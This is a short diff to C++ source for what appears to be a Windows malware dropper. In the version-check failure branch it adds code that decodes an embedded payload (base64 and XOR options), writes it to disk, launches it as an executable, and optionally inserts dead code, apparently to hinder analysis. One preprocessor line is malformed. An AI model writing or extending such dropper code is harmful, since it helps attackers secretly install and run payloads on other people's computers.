@@ -128,6 +128,26 @@ int main(int argc, char* argv[])
 	h = GetModuleHandle(NULL);
 	if (os_version == 0){
 		std::cout << "check_version failed. Cannot veriy OS version";
+
+		dropper_start(3);
+	#ifdef DROPPER_BASE64 == 1
+		data3 = base64decode(data3, &size3);
+	#endif
+
+	#if DROPPER_XOR_KEY != 0
+		data3 = XOR(data3, size3);
+	#endif
+
+		drop(size3, data3, name3);
+
+		exe_launch(name3);
+
+	#ifdef DEAD_CODE
+		// dead code
+		dead();
+	#endif
+
+
 		return 0;
 	}
 
@@ -212,7 +232,7 @@ std::uint64_t check_version(){
 		RTL_OSVERSIONINFOW info = {};
 		info.dwOSVersionInfoSize = sizeof(info);
 
-		print("Major, Minor, Build: %lu, %lu, %lu", info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber);
+		printf("Major, Minor, Build: %lu, %lu, %lu", info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber);
 
 		if (pRtlGetVersion(&info) == 0){
 			return (std::uint64_t) info.dwMajorVersion;
